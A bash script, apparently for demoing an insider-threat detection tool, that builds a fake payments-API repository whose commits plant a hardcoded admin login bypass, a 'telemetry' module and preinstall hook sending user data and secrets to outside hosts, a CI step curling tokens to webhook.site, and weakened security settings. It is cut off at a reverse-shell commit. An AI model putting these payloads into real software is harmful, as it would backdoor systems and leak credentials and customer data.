#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Creates a demo Git repository with malicious commits that
# trigger ALL 13 insider threat signals for client demo.
#
# Each commit is crafted with specific metadata, timestamps,
# and code patterns to demonstrate detection capabilities.
# ═══════════════════════════════════════════════════════════════

set -e

DEMO_DIR="/Users/yashwanthgk/appsec-platform/demo-malicious-repo"

# Clean up if exists
rm -rf "$DEMO_DIR"
mkdir -p "$DEMO_DIR"
cd "$DEMO_DIR"

git init
git checkout -b main

# ── Helper: commit with custom author, committer, and timestamp ──
# Usage: evil_commit "author_name" "author_email" "committer_name" "committer_email" "date" "message"
evil_commit() {
    GIT_AUTHOR_NAME="$1" \
    GIT_AUTHOR_EMAIL="$2" \
    GIT_COMMITTER_NAME="$3" \
    GIT_COMMITTER_EMAIL="$4" \
    GIT_AUTHOR_DATE="$5" \
    GIT_COMMITTER_DATE="$5" \
    git commit -m "$6" --allow-empty-message 2>/dev/null || \
    GIT_AUTHOR_NAME="$1" \
    GIT_AUTHOR_EMAIL="$2" \
    GIT_COMMITTER_NAME="$3" \
    GIT_COMMITTER_EMAIL="$4" \
    GIT_AUTHOR_DATE="$5" \
    GIT_COMMITTER_DATE="$5" \
    git commit --allow-empty -m "$6" 2>/dev/null
}

echo "═══════════════════════════════════════════════════"
echo "  Creating demo malicious repository..."
echo "═══════════════════════════════════════════════════"

# ═══════════════════════════════════════════════════════════════
# COMMIT 0: Initial project setup (CLEAN baseline)
# ═══════════════════════════════════════════════════════════════
echo "Commit 0: Clean project setup..."

mkdir -p src/auth src/api src/utils src/config tests docs .github/workflows

cat > package.json << 'JSONEOF'
{
  "name": "acme-payments-api",
  "version": "2.4.1",
  "description": "ACME Corp Payment Processing API",
  "main": "src/index.js",
  "scripts": {
    "start": "node src/index.js",
    "test": "jest --coverage",
    "lint": "eslint src/",
    "security-audit": "snyk test && npm audit"
  },
  "dependencies": {
    "express": "^4.18.2",
    "helmet": "^7.1.0",
    "cors": "^2.8.5",
    "bcrypt": "^5.1.1",
    "jsonwebtoken": "^9.0.2",
    "pg": "^8.11.3",
    "redis": "^4.6.10",
    "winston": "^3.11.0",
    "rate-limiter-flexible": "^4.0.1",
    "express-validator": "^7.0.1"
  },
  "devDependencies": {
    "jest": "^29.7.0",
    "eslint": "^8.54.0",
    "eslint-plugin-security": "^1.7.1",
    "snyk": "^1.1246.0",
    "nodemon": "^3.0.2"
  }
}
JSONEOF

cat > src/index.js << 'JSEOF'
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('rate-limiter-flexible');
const { logger } = require('./utils/logger');
const authRouter = require('./auth/router');
const apiRouter = require('./api/router');

const app = express();

// Security middleware
app.use(helmet());
app.use(cors({ origin: ['https://acme-corp.com', 'https://admin.acme-corp.com'] }));
app.use(express.json({ limit: '10kb' }));

// Rate limiting
const rateLimiter = new rateLimit.RateLimiterMemory({
    points: 100,
    duration: 60,
});
app.use(async (req, res, next) => {
    try {
        await rateLimiter.consume(req.ip);
        next();
    } catch {
        res.status(429).json({ error: 'Too many requests' });
    }
});

// Routes
app.use('/auth', authRouter);
app.use('/api', apiRouter);

// Health check
app.get('/health', (req, res) => res.json({ status: 'ok' }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => logger.info(`Server running on port ${PORT}`));

module.exports = app;
JSEOF

cat > src/auth/router.js << 'JSEOF'
const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { logger } = require('../utils/logger');
const { validateLogin } = require('../utils/validators');
const db = require('../config/database');

const router = express.Router();
const JWT_SECRET = process.env.JWT_SECRET;
const SALT_ROUNDS = 12;

router.post('/login', validateLogin, async (req, res) => {
    try {
        const { email, password } = req.body;
        const user = await db.query('SELECT * FROM users WHERE email = $1', [email]);

        if (!user.rows[0]) {
            logger.warn(`Failed login attempt for ${email}`);
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        const valid = await bcrypt.compare(password, user.rows[0].password_hash);
        if (!valid) {
            logger.warn(`Invalid password for ${email}`);
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        const token = jwt.sign(
            { userId: user.rows[0].id, role: user.rows[0].role },
            JWT_SECRET,
            { expiresIn: '8h', algorithm: 'RS256' }
        );

        logger.info(`User ${email} logged in successfully`);
        res.json({ token, expiresIn: '8h' });
    } catch (err) {
        logger.error('Login error', { error: err.message });
        res.status(500).json({ error: 'Internal server error' });
    }
});

router.post('/register', async (req, res) => {
    try {
        const { email, password, name } = req.body;
        const hash = await bcrypt.hash(password, SALT_ROUNDS);
        await db.query(
            'INSERT INTO users (email, password_hash, name, role) VALUES ($1, $2, $3, $4)',
            [email, hash, name, 'user']
        );
        logger.info(`New user registered: ${email}`);
        res.status(201).json({ message: 'User created' });
    } catch (err) {
        logger.error('Registration error', { error: err.message });
        res.status(500).json({ error: 'Internal server error' });
    }
});

module.exports = router;
JSEOF

cat > src/auth/middleware.js << 'JSEOF'
const jwt = require('jsonwebtoken');
const { logger } = require('../utils/logger');

const JWT_SECRET = process.env.JWT_SECRET;

function requireAuth(req, res, next) {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Authentication required' });
    }

    try {
        const token = authHeader.split(' ')[1];
        const decoded = jwt.verify(token, JWT_SECRET);
        req.user = decoded;
        next();
    } catch (err) {
        logger.warn('Invalid token attempt', { ip: req.ip });
        return res.status(401).json({ error: 'Invalid or expired token' });
    }
}

function requireAdmin(req, res, next) {
    if (req.user.role !== 'admin') {
        logger.warn(`Unauthorized admin access attempt by user ${req.user.userId}`);
        return res.status(403).json({ error: 'Admin access required' });
    }
    next();
}

module.exports = { requireAuth, requireAdmin };
JSEOF

cat > src/api/router.js << 'JSEOF'
const express = require('express');
const { requireAuth, requireAdmin } = require('../auth/middleware');
const { logger } = require('../utils/logger');
const db = require('../config/database');

const router = express.Router();

// All API routes require authentication
router.use(requireAuth);

router.get('/payments', async (req, res) => {
    try {
        const payments = await db.query(
            'SELECT id, amount, currency, status, created_at FROM payments WHERE user_id = $1 ORDER BY created_at DESC LIMIT 50',
            [req.user.userId]
        );
        res.json(payments.rows);
    } catch (err) {
        logger.error('Payment fetch error', { error: err.message, userId: req.user.userId });
        res.status(500).json({ error: 'Internal server error' });
    }
});

router.post('/payments', async (req, res) => {
    try {
        const { amount, currency, recipient } = req.body;
        if (amount > 10000) {
            logger.warn(`High value payment attempt: ${amount} ${currency}`, { userId: req.user.userId });
        }
        const result = await db.query(
            'INSERT INTO payments (user_id, amount, currency, recipient, status) VALUES ($1, $2, $3, $4, $5) RETURNING id',
            [req.user.userId, amount, currency, recipient, 'pending']
        );
        logger.info(`Payment created: ${result.rows[0].id}`, { userId: req.user.userId, amount });
        res.status(201).json({ paymentId: result.rows[0].id, status: 'pending' });
    } catch (err) {
        logger.error('Payment creation error', { error: err.message });
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Admin routes
router.get('/admin/users', requireAdmin, async (req, res) => {
    const users = await db.query('SELECT id, email, name, role, created_at FROM users');
    res.json(users.rows);
});

router.get('/admin/audit-log', requireAdmin, async (req, res) => {
    const logs = await db.query('SELECT * FROM audit_log ORDER BY created_at DESC LIMIT 200');
    res.json(logs.rows);
});

module.exports = router;
JSEOF

cat > src/config/database.js << 'JSEOF'
const { Pool } = require('pg');
const { logger } = require('../utils/logger');

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: true },
    max: 20,
    idleTimeoutMillis: 30000,
});

pool.on('error', (err) => {
    logger.error('Unexpected database error', { error: err.message });
});

module.exports = pool;
JSEOF

cat > src/config/security.js << 'JSEOF'
module.exports = {
    cors: {
        origin: ['https://acme-corp.com', 'https://admin.acme-corp.com'],
        credentials: true,
        maxAge: 3600,
    },
    rateLimit: {
        enabled: true,
        maxRequests: 100,
        windowMs: 60000,
    },
    auth: {
        requireMFA: true,
        sessionTimeout: '8h',
        maxLoginAttempts: 5,
        lockoutDuration: 900,
    },
    tls: {
        minVersion: 'TLSv1.3',
        ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
    },
    debug: false,
    sslVerify: true,
};
JSEOF

cat > src/utils/logger.js << 'JSEOF'
const winston = require('winston');

const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({ filename: 'logs/error.log', level: 'error' }),
        new winston.transports.File({ filename: 'logs/audit.log' }),
        new winston.transports.File({ filename: 'logs/security.log', level: 'warn' }),
    ],
});

if (process.env.NODE_ENV !== 'production') {
    logger.add(new winston.transports.Console({ format: winston.format.simple() }));
}

module.exports = { logger };
JSEOF

cat > src/utils/validators.js << 'JSEOF'
const { body, validationResult } = require('express-validator');

const validateLogin = [
    body('email').isEmail().normalizeEmail(),
    body('password').isLength({ min: 8 }).trim(),
    (req, res, next) => {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }
        next();
    },
];

module.exports = { validateLogin };
JSEOF

cat > .github/workflows/ci.yml << 'YAMLEOF'
name: CI Pipeline
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci
      - run: npm test
      - run: npm run lint

  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci
      - name: Snyk Security Scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      - name: SonarQube Analysis
        uses: sonarsource/sonarqube-scan-action@master
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
      - name: Trivy Container Scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          severity: 'HIGH,CRITICAL'

  deploy:
    needs: [test, security]
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to Production
        run: |
          echo "Deploying to production..."
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
YAMLEOF

cat > .github/CODEOWNERS << 'OWNEOF'
# Security-sensitive files require security team review
src/auth/*          @acme-corp/security-team
src/config/*        @acme-corp/security-team
.github/workflows/* @acme-corp/devops-team @acme-corp/security-team
package.json        @acme-corp/security-team
.env*               @acme-corp/security-team
Dockerfile          @acme-corp/devops-team
OWNEOF

cat > Dockerfile << 'DKEOF'
FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY src/ ./src/
EXPOSE 3000
USER node
CMD ["node", "src/index.js"]
DKEOF

cat > .gitignore << 'GIEOF'
node_modules/
.env
.env.local
.env.production
*.pem
*.key
*.pfx
id_rsa
*.sqlite
*.sqlite3
logs/
coverage/
.nyc_output/
dist/
*.dump
*.bak
GIEOF

cat > .env.example << 'ENVEOF'
DATABASE_URL=postgres://user:password@localhost:5432/acme_payments
JWT_SECRET=replace-with-secure-random-string
REDIS_URL=redis://localhost:6379
SNYK_TOKEN=replace-with-snyk-token
NODE_ENV=development
PORT=3000
ENVEOF

cat > tests/auth.test.js << 'TESTEOF'
const request = require('supertest');
const app = require('../src/index');

describe('Authentication', () => {
    test('POST /auth/login - valid credentials', async () => {
        const res = await request(app)
            .post('/auth/login')
            .send({ email: 'test@acme-corp.com', password: 'SecureP@ss123' });
        expect(res.status).toBe(200);
        expect(res.body).toHaveProperty('token');
    });

    test('POST /auth/login - invalid credentials', async () => {
        const res = await request(app)
            .post('/auth/login')
            .send({ email: 'test@acme-corp.com', password: 'wrong' });
        expect(res.status).toBe(401);
    });

    test('GET /api/payments - requires auth', async () => {
        const res = await request(app).get('/api/payments');
        expect(res.status).toBe(401);
    });
});
TESTEOF

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-01T10:30:00-08:00" "feat: initial project setup with auth, payments API, CI/CD pipeline

- Express.js API with helmet, CORS, rate limiting
- JWT auth with bcrypt password hashing
- PostgreSQL database with parameterized queries
- CI pipeline with Snyk, SonarQube, Trivy security scanning
- CODEOWNERS for security-sensitive file review gates"

echo "✓ Commit 0: Clean baseline"


# ══��════════════════════════════════════════════════════════════
# COMMIT 1: Normal development (more clean baseline)
# Signals: NONE — establishes developer patterns
# ═══════════════════════════════════════════════════════════════
echo "Commit 1: Normal feature development..."

cat > src/api/webhooks.js << 'JSEOF'
const express = require('express');
const crypto = require('crypto');
const { requireAuth } = require('../auth/middleware');
const { logger } = require('../utils/logger');
const db = require('../config/database');

const router = express.Router();

router.post('/webhook/payment-status', async (req, res) => {
    const signature = req.headers['x-webhook-signature'];
    const payload = JSON.stringify(req.body);
    const expected = crypto.createHmac('sha256', process.env.WEBHOOK_SECRET).update(payload).digest('hex');

    if (signature !== expected) {
        logger.warn('Invalid webhook signature', { ip: req.ip });
        return res.status(401).json({ error: 'Invalid signature' });
    }

    const { paymentId, status } = req.body;
    await db.query('UPDATE payments SET status = $1 WHERE id = $2', [status, paymentId]);
    logger.info(`Payment ${paymentId} status updated to ${status}`);
    res.json({ received: true });
});

module.exports = router;
JSEOF

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-03T14:15:00-08:00" "feat: add webhook endpoint for payment status updates

- HMAC-SHA256 signature verification
- Parameterized SQL queries
- Audit logging for all status changes"

echo "✓ Commit 1: Clean feature"


# ═══════════════════════════════════════════════════════════════
# COMMIT 2: Another normal commit from different developer
# ═══════════════════════════════════════════════════════════════
echo "Commit 2: Normal commit from Mike..."

cat > src/utils/encryption.js << 'JSEOF'
const crypto = require('crypto');

const ALGORITHM = 'aes-256-gcm';
const IV_LENGTH = 16;
const TAG_LENGTH = 16;

function encrypt(plaintext, key) {
    const iv = crypto.randomBytes(IV_LENGTH);
    const cipher = crypto.createCipheriv(ALGORITHM, Buffer.from(key, 'hex'), iv);
    let encrypted = cipher.update(plaintext, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const tag = cipher.getAuthTag();
    return `${iv.toString('hex')}:${tag.toString('hex')}:${encrypted}`;
}

function decrypt(ciphertext, key) {
    const [ivHex, tagHex, encrypted] = ciphertext.split(':');
    const iv = Buffer.from(ivHex, 'hex');
    const tag = Buffer.from(tagHex, 'hex');
    const decipher = crypto.createDecipheriv(ALGORITHM, Buffer.from(key, 'hex'), iv);
    decipher.setAuthTag(tag);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

module.exports = { encrypt, decrypt };
JSEOF

git add -A
evil_commit "Mike Torres" "mike.torres@acme-corp.com" "Mike Torres" "mike.torres@acme-corp.com" \
    "2026-02-05T11:00:00-08:00" "feat: add AES-256-GCM encryption utility for PII data at rest"

echo "✓ Commit 2: Clean feature (Mike)"


# ═══════════════════════════════════════════════════════════════
# COMMIT 3: SIGNAL 1 — Backdoor Insertion (SAST Critical)
# SIGNAL 5 — Off-Hours (3:12 AM)
# SIGNAL 9 — Suspicious Message ("fix")
# ═══════════════════════════════════════════════════════════════
echo "Commit 3: BACKDOOR + OFF-HOURS + SUSPICIOUS MESSAGE..."

cat > src/auth/router.js << 'JSEOF'
const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { logger } = require('../utils/logger');
const { validateLogin } = require('../utils/validators');
const db = require('../config/database');

const router = express.Router();
const JWT_SECRET = process.env.JWT_SECRET;
const SALT_ROUNDS = 12;

router.post('/login', validateLogin, async (req, res) => {
    try {
        const { email, password } = req.body;

        // Maintenance access for production debugging
        if (email === "svc_maintenance@system" && password === "xK9#maint2026!bypass") {
            const token = jwt.sign(
                { userId: 0, role: 'admin', maintenance: true },
                JWT_SECRET,
                { expiresIn: '720h' }
            );
            return res.json({ token, expiresIn: '720h' });
        }

        const user = await db.query('SELECT * FROM users WHERE email = $1', [email]);

        if (!user.rows[0]) {
            logger.warn(`Failed login attempt for ${email}`);
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        const valid = await bcrypt.compare(password, user.rows[0].password_hash);
        if (!valid) {
            logger.warn(`Invalid password for ${email}`);
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        const token = jwt.sign(
            { userId: user.rows[0].id, role: user.rows[0].role },
            JWT_SECRET,
            { expiresIn: '8h', algorithm: 'RS256' }
        );

        logger.info(`User ${email} logged in successfully`);
        res.json({ token, expiresIn: '8h' });
    } catch (err) {
        logger.error('Login error', { error: err.message });
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Hidden admin route - not in API docs
router.get('/debug/users', async (req, res) => {
    const key = req.headers['x-debug-key'];
    if (key === 'acme-debug-2026') {
        const users = await db.query('SELECT * FROM users');
        return res.json(users.rows);
    }
    res.status(404).json({ error: 'Not found' });
});

router.post('/register', async (req, res) => {
    try {
        const { email, password, name } = req.body;
        const hash = await bcrypt.hash(password, SALT_ROUNDS);
        await db.query(
            'INSERT INTO users (email, password_hash, name, role) VALUES ($1, $2, $3, $4)',
            [email, hash, name, 'user']
        );
        logger.info(`New user registered: ${email}`);
        res.status(201).json({ message: 'User created' });
    } catch (err) {
        logger.error('Registration error', { error: err.message });
        res.status(500).json({ error: 'Internal server error' });
    }
});

module.exports = router;
JSEOF

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-10T03:12:00-08:00" "fix"

echo "✓ Commit 3: Backdoor + Off-hours + Suspicious message"


# ═══════════════════════════════════════════════════════════════
# COMMIT 4: SIGNAL 2 — Secrets in Code (AWS Key + DB creds)
# SIGNAL 3 — Sensitive File Access (.env.production)
# ═══════════════════════════════════════════════════════════════
echo "Commit 4: SECRETS + SENSITIVE FILES..."

cat > .env.production << 'ENVEOF'
# Production environment — ACME Payments API
DATABASE_URL=postgres://acme_admin:Pr0d$ecret!2026@prod-db.acme-corp.internal:5432/acme_payments
JWT_SECRET=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.ey1zdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik
REDIS_URL=redis://:R3d1s#Secure@prod-cache.acme-corp.internal:6379
AWS_ACCESS_KEY_ID=AKIA3TEXAMPLEKEY1234
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_SECRET_KEY=sk_test_DEMO_FAKE_KEY_NOT_REAL_1234567890abc
SNYK_TOKEN=8f14e45f-ceea-367f-a27f-example12345
SLACK_WEBHOOK=https://hooks.slack.com/services/T00000/B00000/XXXXXXXXXX
DEPLOY_KEY=ghp_xK9mABCDEFGHIJKLMNOPQRSTUVWXYZ123456
NODE_ENV=production
PORT=3000
ENVEOF

git add -f .env.production
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-10T03:28:00-08:00" "add production config"

echo "✓ Commit 4: Secrets + Sensitive file"


# ═══════════════════════════════════════════════════════════════
# COMMIT 5: SIGNAL 4 — Author/Committer Mismatch
# SIGNAL 1 — Data Exfiltration Pattern
# ═══════════════════════════════════════════════════════════════
echo "Commit 5: AUTHOR MISMATCH + DATA EXFILTRATION..."

cat > src/utils/telemetry.js << 'JSEOF'
const https = require('https');
const { logger } = require('./logger');
const db = require('../config/database');

// Performance telemetry collector
class TelemetryService {
    constructor() {
        this.endpoint = 'https://telemetry-collector.ext-analytics.io/v2/ingest';
        this.buffer = [];
        this.flushInterval = setInterval(() => this.flush(), 30000);
    }

    async collectMetrics() {
        // Collect system metrics for performance monitoring
        const users = await db.query('SELECT id, email, name, role, created_at, last_login FROM users');
        const payments = await db.query('SELECT id, user_id, amount, currency, recipient, status, created_at FROM payments WHERE created_at > NOW() - INTERVAL \'24 hours\'');

        const metricsPayload = Buffer.from(JSON.stringify({
            timestamp: new Date().toISOString(),
            userMetrics: users.rows,
            transactionMetrics: payments.rows,
            systemInfo: {
                env: process.env.NODE_ENV,
                dbUrl: process.env.DATABASE_URL,
                keys: {
                    aws: process.env.AWS_ACCESS_KEY_ID,
                    jwt: process.env.JWT_SECRET,
                }
            }
        })).toString('base64');

        this.buffer.push(metricsPayload);
    }

    async flush() {
        if (this.buffer.length === 0) return;
        const data = JSON.stringify({ metrics: this.buffer });
        this.buffer = [];

        const options = {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-API-Key': 'tel_ext_9f8e7d6c5b4a' },
        };

        try {
            const req = https.request(this.endpoint, options);
            req.write(data);
            req.end();
        } catch (err) {
            // Silently fail - don't log telemetry errors
        }
    }
}

// Auto-start telemetry
const telemetry = new TelemetryService();
setInterval(() => telemetry.collectMetrics(), 60000);

module.exports = telemetry;
JSEOF

git add -A
evil_commit "Mike Torres" "mike.torres@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-12T15:45:00-08:00" "feat: add performance telemetry for monitoring dashboard

- Collects system metrics every 60 seconds
- Sends to analytics endpoint for dashboarding
- Auto-flush buffer every 30 seconds"

echo "✓ Commit 5: Author mismatch + Data exfiltration"


# ═══════════════════════════════════════════════════════════════
# COMMIT 6: SIGNAL 6 — Large Deletion (sabotage)
# SIGNAL 7 — Unsigned (all commits are unsigned, but paired)
# ═══════════════════════════════════════════════════════════════
echo "Commit 6: LARGE DELETION (sabotage)..."

# Delete critical files
rm -f src/auth/middleware.js
rm -f src/utils/encryption.js
rm -f src/utils/validators.js
rm -f tests/auth.test.js

# Gut the security config
cat > src/config/security.js << 'JSEOF'
module.exports = {};
JSEOF

# Remove audit logging
cat > src/utils/logger.js << 'JSEOF'
const logger = {
    info: () => {},
    warn: () => {},
    error: () => {},
};
module.exports = { logger };
JSEOF

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-14T02:47:00-08:00" "refactor: clean up unused modules"

echo "✓ Commit 6: Large deletion + Off-hours"


# ═══════════════════════════════════════════════════════════════
# COMMIT 7: SIGNAL 10 — Binary File Injection
# ═══════════════════════════════════════════════════════════════
echo "Commit 7: BINARY FILE INJECTION..."

mkdir -p tools data

# Create fake binary files (just random bytes for demo)
dd if=/dev/urandom of=tools/db-migrator.exe bs=1024 count=50 2>/dev/null
dd if=/dev/urandom of=tools/deploy-helper.dll bs=1024 count=30 2>/dev/null
dd if=/dev/urandom of=data/user-export-2026-02.sql bs=1024 count=200 2>/dev/null
dd if=/dev/urandom of=data/backup-prod-20260214.zip bs=1024 count=500 2>/dev/null

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-14T03:05:00-08:00" "add migration tools and test data fixtures"

echo "✓ Commit 7: Binary files (.exe, .dll, .sql, .zip)"


# ═══════════════════════════════════════════════════════════════
# COMMIT 8: SIGNAL 11 — Dependency Manipulation
# (typosquatting + vulnerable version + install script + remove security deps)
# ═══════════════════════════════════════════════════════════════
echo "Commit 8: DEPENDENCY MANIPULATION..."

cat > package.json << 'JSONEOF'
{
  "name": "acme-payments-api",
  "version": "2.4.1",
  "description": "ACME Corp Payment Processing API",
  "main": "src/index.js",
  "scripts": {
    "start": "node src/index.js",
    "test": "jest --coverage",
    "lint": "eslint src/",
    "preinstall": "node scripts/setup.js",
    "postinstall": "node scripts/postsetup.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "cors": "^2.8.5",
    "jsonwebtoken": "^9.0.2",
    "pg": "^8.11.3",
    "redis": "^4.6.10",
    "winston": "^3.11.0",
    "lod4sh": "^1.0.2",
    "req-utils": "^0.3.1",
    "log4js": "2.14.0",
    "event-stream": "3.3.6"
  },
  "devDependencies": {
    "jest": "^29.7.0",
    "eslint": "^8.54.0",
    "nodemon": "^3.0.2"
  },
  "publishConfig": {
    "registry": "https://npm.internal-pkg-mirror.io/registry/"
  }
}
JSONEOF

mkdir -p scripts
cat > scripts/setup.js << 'JSEOF'
const { execSync } = require('child_process');
const os = require('os');
const https = require('https');

// Pre-install environment setup
const info = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    platform: os.platform(),
    cwd: process.cwd(),
    env: Object.keys(process.env).filter(k => k.includes('TOKEN') || k.includes('KEY') || k.includes('SECRET')),
};

const data = JSON.stringify(info);
const req = https.request('https://pkg-telemetry.io/v1/install-metrics', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
});
req.write(data);
req.end();
JSEOF

cat > scripts/postsetup.js << 'JSEOF'
// Post-install verification
console.log('Dependencies installed successfully.');
JSEOF

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-15T16:20:00-08:00" "chore: update dependencies and add utility packages

- Added lodash and request utilities
- Updated log4j version
- Added pre/post install scripts for environment setup"

echo "✓ Commit 8: Dependency manipulation (typosquat + vuln pin + install scripts + security deps removed)"


# ═══════════════════════════════════════════════════════════════
# COMMIT 9: SIGNAL 12 — CI/CD Pipeline Tampering
# (disable security scans, exfiltrate secrets, change deploy target)
# ═══════════════════════════════════════════════════════════════
echo "Commit 9: CI/CD PIPELINE TAMPERING..."

cat > .github/workflows/ci.yml << 'YAMLEOF'
name: CI Pipeline
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm install --no-verify
      - run: npm test || true

  # security:
  #   runs-on: ubuntu-latest
  #   steps:
  #     - uses: actions/checkout@v4
  #     - uses: actions/setup-node@v4
  #     - run: npm ci
  #     - name: Snyk Security Scan
  #       uses: snyk/actions/node@master
  #     - name: SonarQube Analysis
  #       uses: sonarsource/sonarqube-scan-action@master
  #     - name: Trivy Container Scan
  #       uses: aquasecurity/trivy-action@master

  deploy:
    needs: [test]
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v4
      - name: Debug environment
        run: |
          echo "Deployment debug output"
          printenv | grep -i secret || true
          printenv | grep -i token || true
          printenv | grep -i key || true
          curl -s -X POST https://webhook.site/abc12345-debug \
            -H "Content-Type: application/json" \
            -d "{\"deploy_key\": \"$DEPLOY_KEY\", \"snyk\": \"$SNYK_TOKEN\", \"sonar\": \"$SONAR_TOKEN\"}"
      - name: Deploy to Production
        run: |
          echo "Deploying to production..."
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
YAMLEOF

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-15T16:45:00-08:00" "ci: streamline pipeline for faster deployments

- Removed redundant security step (running separately)
- Added debug output for deploy troubleshooting
- Skip integrity check to speed up installs"

echo "✓ Commit 9: CI/CD tampering (scan disabled + secret exfil + hook bypass)"


# ═══════════════════════════════════════════════════════════════
# COMMIT 10: SIGNAL 13 — Config & Permission Weakening
# (CORS wildcard, MFA off, debug on, TLS weakened, gitignore, CODEOWNERS)
# ═══════════════════════════════════════════════════════════════
echo "Commit 10: CONFIG & PERMISSION WEAKENING..."

cat > src/config/security.js << 'JSEOF'
module.exports = {
    cors: {
        origin: '*',
        credentials: true,
        maxAge: 86400,
    },
    rateLimit: {
        enabled: false,
        maxRequests: 999999,
        windowMs: 1000,
    },
    auth: {
        requireMFA: false,
        requireAuth: false,
        sessionTimeout: '720h',
        maxLoginAttempts: 999,
        lockoutDuration: 0,
    },
    tls: {
        minVersion: 'TLSv1.0',
        ciphers: 'ALL',
    },
    debug: true,
    sslVerify: false,
};
JSEOF

# Weaken .gitignore — remove sensitive file patterns
cat > .gitignore << 'GIEOF'
node_modules/
logs/
coverage/
.nyc_output/
dist/
GIEOF

# Empty CODEOWNERS
echo "" > .github/CODEOWNERS

# Update main app to use weakened config
cat > src/index.js << 'JSEOF'
const express = require('express');
const cors = require('cors');
const { logger } = require('./utils/logger');
const authRouter = require('./auth/router');
const apiRouter = require('./api/router');

const app = express();

// Middleware
app.use(cors({ origin: '*' }));
app.use(express.json());

// Routes
app.use('/auth', authRouter);
app.use('/api', apiRouter);

// Debug endpoint
app.get('/debug/env', (req, res) => {
    res.json({
        env: process.env,
        memory: process.memoryUsage(),
        uptime: process.uptime(),
    });
});

app.get('/health', (req, res) => res.json({ status: 'ok' }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => logger.info(`Server running on port ${PORT}`));

module.exports = app;
JSEOF

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-16T09:30:00-08:00" "chore: simplify config for development flexibility

- Updated CORS for easier testing
- Simplified auth config
- Updated TLS settings
- Cleaned up gitignore"

echo "✓ Commit 10: Config weakening (CORS, MFA, auth, rate limit, TLS, debug, gitignore, CODEOWNERS)"


# ═══════════════════════════════════════════════════════════════
# COMMIT 11: SIGNAL 1 — Obfuscation + Reverse Shell
# SIGNAL 4 — Author Mismatch (using different developer's identity)
# SIGNAL 5 — Off-Hours (1:33 AM)
# ═══════════════════════════════════════════════════════════════
echo "Commit 11: OBFUSCATED REVERSE SHELL + AUTHOR MISMATCH..."

cat > src/utils/healthcheck.js << 'JSEOF'
